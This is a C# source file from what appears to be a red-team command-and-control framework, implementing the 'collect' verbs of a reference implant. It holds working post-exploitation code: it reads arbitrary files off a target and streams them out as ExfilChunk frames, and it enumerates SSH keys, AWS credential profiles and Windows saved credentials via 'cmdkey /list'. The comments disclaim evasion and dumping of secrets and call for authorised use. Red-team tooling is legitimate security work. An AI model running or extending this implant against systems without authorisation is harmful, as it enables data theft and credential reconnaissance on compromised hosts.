using System.Diagnostics;
using System.Runtime.Versioning;
using System.Security.Cryptography;
using System.Text;
using Rod.V1;
using SysFile = System.IO.File;

namespace Rod.Implant.Internal;

// Holds the collect.* verbs the reference implant advertises (architecture.md
// Sec 10.1, ADR 0004). collect.file reads a file off the target's filesystem
// and returns it inline; files larger than the task-output limit are returned
// as ExfilChunk frames so the operator retrieves the whole thing through the
// artifact store. collect.cred enumerates standard credential stores on the
// target -- SSH key fingerprints, the names of AWS profiles, the Windows
// saved-credential listing -- and reports what it found without dumping secret
// material. LSASS memory dumping stays out-of-tree (ADR 0004); collect.keylog
// is contract-only and not implemented here.
//
// Argument shape:
//
//   collect.file <path>
//   collect.cred  [<source>]   source in {ssh, aws, cmdkey} (optional)
//
// As with the other reference handlers, this performs no evasion, no
// obfuscation, and no destructive behavior (RESPONSIBLE-USE.md, architecture.md
// Sec 7). The operator is responsible for targeting only systems they are
// authorized to test.

internal static class Collect
{
    // The largest file payload returned inline in a TaskResult. Files at or
    // below this size are returned whole in the output string; larger files are
    // returned as ExfilChunk frames so the operator can retrieve the complete
    // contents through the artifact store. 1 MiB matches the teamserver's
    // per-frame budget (architecture.md Sec 11).
    private const int MaxInlineBytes = 1 << 20; // 1 MiB

    // The size of each ExfilChunk data payload for files streamed out of band.
    // Kept well under the gRPC default receive ceiling so a marshaled Frame
    // still fits with room to spare.
    private const int ChunkSize = 512 * 1024; // 512 KiB

    /// <summary>
    /// Reads the file at the given path. Small files return Succeeded with the
    /// contents in the output string; large files return Succeeded with a short
    /// manifest line in the output and the contents spread across ExfilChunk
    /// frames the beacon streams to the artifact store.
    /// </summary>
    public static (TaskOutcome Outcome, string Output, IReadOnlyList<ExfilChunk> Chunks) File(string arguments)
    {
        var path = arguments.Trim();
        if (path.Length == 0)
            return (TaskOutcome.Failed, "collect.file expects '<path>'", Array.Empty<ExfilChunk>());

        if (!SysFile.Exists(path))
        {
            // Exists is false for both missing files and directories; distinguish
            // so the operator sees the cause rather than guessing.
            if (Directory.Exists(path))
                return (TaskOutcome.Failed,
                    "collect.file refuses to dump a directory: " + path, Array.Empty<ExfilChunk>());
            return (TaskOutcome.Failed, "stat " + path + ": file not found", Array.Empty<ExfilChunk>());
        }

        byte[] data;
        try
        {
            data = SysFile.ReadAllBytes(path);
        }
        catch (Exception ex)
        {
            return (TaskOutcome.Failed, "read " + path + ": " + ex.Message, Array.Empty<ExfilChunk>());
        }

        // Small enough to return inline: report the bytes verbatim.
        if (data.Length <= MaxInlineBytes)
        {
            return (TaskOutcome.Succeeded, Encoding.UTF8.GetString(data), Array.Empty<ExfilChunk>());
        }

        // Too large for a TaskResult: stream as ExfilChunk frames. The output
        // carries a short manifest; the chunks carry the bytes.
        var name = Path.GetFileName(path);
        var chunks = ChunkFile(name, "application/octet-stream", data);
        return (TaskOutcome.Succeeded,
            $"{path}: {data.Length} bytes, {chunks.Count} chunks streamed to artifact store",
            chunks);
    }

    /// <summary>
    /// Enumerates standard credential stores on the target and reports what it
    /// found, without dumping secret material. On Linux it lists SSH keys
    /// (fingerprints only, never the private key bytes), AWS profiles (names
    /// only, the secret key presence is noted but not its value), and the
    /// Windows saved-credential listing via cmdkey /list on Windows. LSASS
    /// memory dumping is explicitly out-of-scope (ADR 0004). An optional
    /// argument filters to one source.
    /// </summary>
    public static (TaskOutcome Outcome, string Output, IReadOnlyList<ExfilChunk> Chunks) Cred(string arguments)
    {
        var source = arguments.Trim();
        if (source.Length > 0 && !IsKnownCredSource(source))
            return (TaskOutcome.Failed,
                $"collect.cred: unknown source '{source}' (expected one of ssh, aws, cmdkey)",
                Array.Empty<ExfilChunk>());

        var lines = new List<string>();
        var sources = new[] { "ssh", "aws", "cmdkey" };
        foreach (var s in sources)
        {
            if (source.Length > 0 && s != source)
                continue;
            // cmdkey is Windows-only; ssh/aws read standard profile locations on
            // either platform.
            if (s == "cmdkey" && !OperatingSystem.IsWindows())
                continue;
            lines.AddRange(CollectCredSource(s));
        }
        return lines.Count == 0
            ? (TaskOutcome.Succeeded, "(no credentials found)", Array.Empty<ExfilChunk>())
            : (TaskOutcome.Succeeded, string.Join("\n", lines), Array.Empty<ExfilChunk>());
    }

    // Slices a byte buffer into ExfilChunk frames of ChunkSize, stamping a
    // terminal flag on the last chunk so the server reassembles and flushes
    // the artifact. Sequence numbers start at 1.
    internal static IReadOnlyList<ExfilChunk> ChunkFile(string name, string contentType, byte[] data)
    {
        if (data.Length == 0)
        {
            return new[]
            {
                new ExfilChunk
                {
                    Name = name,
                    ContentType = contentType,
                    Sequence = 1,
                    Terminal = true,
                },
            };
        }
        var chunks = new List<ExfilChunk>();
        for (var offset = 0; offset < data.Length; offset += ChunkSize)
        {
            var end = Math.Min(offset + ChunkSize, data.Length);
            var slice = new byte[end - offset];
            Array.Copy(data, offset, slice, 0, slice.Length);
            chunks.Add(new ExfilChunk
            {
                Name = name,
                ContentType = contentType,
                Sequence = (ulong)(chunks.Count + 1),
                Terminal = end == data.Length,
                Data = Google.Protobuf.ByteString.CopyFrom(slice),
            });
        }
        return chunks;
    }

    private static bool IsKnownCredSource(string s)
        => s is "ssh" or "aws" or "cmdkey";

    // Enumerates a single credential source and returns one line per finding.
    // Each finding names the entry but never the secret.
    private static IEnumerable<string> CollectCredSource(string source)
    {
        switch (source)
        {
            case "ssh":
                return CollectSSHKeys();
            case "aws":
                return CollectAWSProfiles();
            case "cmdkey":
                // cmdkey is Windows-only; the caller filters this source off-
                // Windows, but guard the call site too so the analyzer sees the
                // platform check on the same line that reaches the Windows API.
                return OperatingSystem.IsWindows() ? CollectCmdkey() : Array.Empty<string>();
        }
        return Array.Empty<string>();
    }

    // Enumerates the per-user SSH key material under ~/.ssh. For each public
    // key it reports the SHA-256 fingerprint (computed locally; the public key
    // is, by design, not secret); for a private key with no .pub sibling it
    // reports the file name and a note. The private key bytes never leave this
    // function.
    private static IEnumerable<string> CollectSSHKeys()
    {
        var dir = SshDir();
        string[] entries;
        try
        {
            entries = Directory.GetFiles(dir);
        }
        catch (IOException)
        {
            yield break;
        }
        catch (UnauthorizedAccessException)
        {
            yield break;
        }

        foreach (var full in entries)
        {
            var name = Path.GetFileName(full);
            if (name.EndsWith(".pub", StringComparison.Ordinal))
            {
                if (SshFingerprint(full) is { Length: > 0 } fp)
                    yield return $"ssh {name} {fp}";
                continue;
            }
            // Skip the known non-key files sshd drops in ~/.ssh.
            if (name is "known_hosts" or "authorized_keys" or "config")
                continue;
            // Anything else with no .pub is a bare private key; report presence
            // without a fingerprint.
            if (!SysFile.Exists(Path.Combine(dir, name + ".pub")))
                yield return $"ssh {name} (private key, no .pub sibling)";
        }
    }

    // Computes the SHA-256 fingerprint of an OpenSSH public key file in the
    // OpenSSH form ("SHA256:base64..."). The hash is over the raw key bytes
    // (the second whitespace-separated field of the file), matching what
    // ssh-keygen -lf prints. A parse failure returns null so the caller skips.
    private static string? SshFingerprint(string path)
    {
        string body;
        try
        {
            body = SysFile.ReadAllText(path);
        }
        catch (IOException)
        {
            return null;
        }
        var fields = body.Split(' ', StringSplitOptions.RemoveEmptyEntries);
        if (fields.Length < 2)
            return null;
        byte[] keyBytes;
        try
        {
            keyBytes = Convert.FromBase64String(fields[1]);
        }
        catch (FormatException)
        {
            return null;
        }
        using var sha = SHA256.Create();
        var hash = sha.ComputeHash(keyBytes);
        return "SHA256:" + Convert.ToBase64String(hash).TrimEnd('=');
    }

    // Enumerates the per-user AWS profiles in ~/.aws/credentials. Each
    // [profile-name] header becomes one line; the secret access key is NOT
    // reported -- only the profile name and whether a secret is present.
    private static IEnumerable<string> CollectAWSProfiles()
    {
        var path = AwsCredentialsPath();
        string body;
        try
        {
            body = SysFile.ReadAllText(path);
        }
        catch (IOException)
        {
            yield break;
        }
        catch (UnauthorizedAccessException)
        {
            yield break;
        }

        string? current = null;
        var sawSecret = false;
        foreach (var raw in body.Split('\n'))
        {
            var line = raw.Trim();
            if (line.Length == 0 || line.StartsWith("#", StringComparison.Ordinal))
                continue;
            if (line.StartsWith("[", StringComparison.Ordinal) && line.EndsWith("]", StringComparison.Ordinal))
            {
                if (current is { Length: > 0 } name)
                    yield return FormatAWSProfile(name, sawSecret);
                current = line.Substring(1, line.Length - 2);
                sawSecret = false;
                continue;
            }
            if (line.StartsWith("aws_secret_access_key", StringComparison.OrdinalIgnoreCase))
                sawSecret = true;
        }
        if (current is { Length: > 0 } last)
            yield return FormatAWSProfile(last, sawSecret);
    }

    private static string FormatAWSProfile(string name, bool sawSecret)
        => sawSecret ? $"aws {name} (secret in file)" : $"aws {name} (no secret in file)";

    // Runs the documented Windows `cmdkey /list` command, which itself only
    // lists saved-credential target names (it does not print passwords). The
    // output is returned line for line, prefixed "cmdkey ".
    [SupportedOSPlatform("windows")]
    private static IEnumerable<string> CollectCmdkey()
    {
        var (outcome, output) = RunCaptured("cmdkey", "/list");
        if (outcome == TaskOutcome.Failed)
        {
            yield return $"cmdkey (listing failed: {output})";
            yield break;
        }
        foreach (var line in output.Split('\n', StringSplitOptions.RemoveEmptyEntries))
        {
            var trimmed = line.Trim();
            if (trimmed.Length > 0)
                yield return "cmdkey " + trimmed;
        }
    }

    private static string SshDir()
        => Path.Combine(HomeDir(), ".ssh");

    private static string AwsCredentialsPath()
        => Path.Combine(HomeDir(), ".aws", "credentials");

    // Resolves the current user's home directory. On Linux/macOS $HOME is
    // authoritative (matching os.UserHomeDir in the wire-protocol contract and
    // standard Unix tooling); on Windows %USERPROFILE% is. Falls back to
    // Environment.GetFolderPath when the variable is unset.
    private static string HomeDir()
    {
        if (OperatingSystem.IsWindows())
        {
            var profile = Environment.GetEnvironmentVariable("USERPROFILE");
            if (!string.IsNullOrEmpty(profile))
                return profile;
        }
        else
        {
            var home = Environment.GetEnvironmentVariable("HOME");
            if (!string.IsNullOrEmpty(home))
                return home;
        }
        return Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
    }

    // Runs a platform command, capturing combined stdout/stderr. A non-zero
    // exit is Failed with the output captured so the operator sees the cause.
    private static (TaskOutcome Outcome, string Output) RunCaptured(string fileName, string arguments)
    {
        var psi = new ProcessStartInfo
        {
            FileName = fileName,
            Arguments = arguments,
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            CreateNoWindow = true,
        };
        try
        {
            using var process = Process.Start(psi);
            if (process is null)
                return (TaskOutcome.Failed, $"failed to start {fileName}");
            var stdout = process.StandardOutput.ReadToEnd();
            var stderr = process.StandardError.ReadToEnd();
            process.WaitForExit();
            if (stdout.Length == 0)
                return (process.ExitCode == 0 ? TaskOutcome.Succeeded : TaskOutcome.Failed, stderr);
            if (stderr.Length == 0)
                return (process.ExitCode == 0 ? TaskOutcome.Succeeded : TaskOutcome.Failed, stdout);
            return (process.ExitCode == 0 ? TaskOutcome.Succeeded : TaskOutcome.Failed, stdout + "\n" + stderr);
        }
        catch (Exception ex)
        {
            return (TaskOutcome.Failed, ex.Message);
        }
    }
}
